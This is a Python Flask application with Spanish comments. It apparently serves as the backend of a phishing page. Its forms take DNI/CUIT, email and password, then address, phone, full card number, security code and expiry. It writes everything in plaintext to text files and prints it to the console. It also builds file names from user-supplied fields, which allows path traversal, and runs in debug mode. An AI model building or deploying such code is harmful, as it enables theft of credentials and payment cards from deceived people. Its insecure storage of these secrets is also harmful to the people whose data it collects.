from flask import Flask, request, redirect, render_template
import os

app = Flask(__name__)

# Directorio para guardar los archivos de texto
SAVE_DIR = 'data'
os.makedirs(SAVE_DIR, exist_ok=True)

@app.route('/')
def register():
    return render_template('register.html')

@app.route('/process_form', methods=['POST'])
def process_form():
    try:
        # Recibe los datos del formulario de registro
        tipo = request.form.get('tipo')
        dni_cuit = request.form.get('dni_cuit')
        email = request.form.get('email')
        password = request.form.get('password')
        terms = request.form.get('terms')

        # Validación básica
        if not (tipo and dni_cuit and email and password and terms):
            return render_template('register.html', error="Todos los campos son obligatorios.")

        # Formatear datos de registro
        user_data = f"Tipo: {tipo}\nDNI/CUIT: {dni_cuit}\nEmail: {email}\nPassword: {password}\n----------------------\n"

        # Guardar en el archivo de texto
        file_path = os.path.join(SAVE_DIR, f'{dni_cuit}.txt')
        with open(file_path, 'a') as file:
            file.write(user_data)

        # Redirige a la página create.html
        return render_template('create.html')

    except Exception as e:
        return render_template('register.html', error=str(e))

@app.route('/process_create_form', methods=['POST'])
def process_create_form():
    try:
        # Depuración para ver todos los campos recibidos
        print(request.form)

        # Recibe los datos del formulario de creación
        user_id = request.form.get('user_id')
        nombre = request.form.get('nombre')
        apellido = request.form.get('apellido')
        localidad = request.form.get('localidad')
        provincia = request.form.get('provincia')
        calle = request.form.get('calle')
        numero = request.form.get('numero')
        piso = request.form.get('piso', 'N/A')
        departamento = request.form.get('departamento', 'N/A')
        telefono = request.form.get('telefono')
        tarjeta = request.form.get('nom_tarjeta')
        # Selecciona el último valor de num_tarjeta
        num_tarjeta = request.form.getlist('num_tarjeta')[-1]
        titular = request.form.get('titular')
        cod_seguridad = request.form.get('codigo_seguridad')
        mes_vencimiento = request.form.get('mes_vencimiento')
        ano_vencimiento = request.form.get('ano_vencimiento')

        # Validación básica
        if not (nombre and apellido and calle and numero and telefono and tarjeta and num_tarjeta and titular and cod_seguridad and mes_vencimiento and ano_vencimiento):
            return render_template('create.html', error="Todos los campos obligatorios deben ser completados.")

        # Formatear datos de creación
        user_data = f"Nombre: {nombre}\nApellido: {apellido}\nLocalidad: {localidad}\nProvincia: {provincia}\nCalle: {calle}\nNumero: {numero}\nPiso: {piso}\nDepartamento: {departamento}\nTeléfono: {telefono}\nTarjeta: {tarjeta}\nNúmero Tarjeta: {num_tarjeta}\nTitular: {titular}\nCódigo Seguridad: {cod_seguridad}\nVencimiento: {mes_vencimiento}/{ano_vencimiento}\n----------------------\n"

        # Crear archivo separado para los datos de creación
        file_path = os.path.join(SAVE_DIR, f'{user_id}_datos_creacion.txt')

        # Verificar permisos antes de escribir
        if not os.access(SAVE_DIR, os.W_OK):
            print(f"No hay permisos para escribir en {SAVE_DIR}")
            return render_template('create.html', error="Error de permisos al guardar el archivo.")

        print(f"Intentando guardar en: {file_path}")
        with open(file_path, 'a') as file:
            file.write(user_data)

        # Confirmar guardado exitoso
        print(f"Datos guardados en: {file_path}")
        print(f"Contenido guardado: {user_data}")

        # Confirmar éxito
        return render_template('success.html')

    except Exception as e:
        print(f"Error al guardar: {e}")
        return render_template('create.html', error=str(e))

if __name__ == '__main__':
    app.run(debug=True)
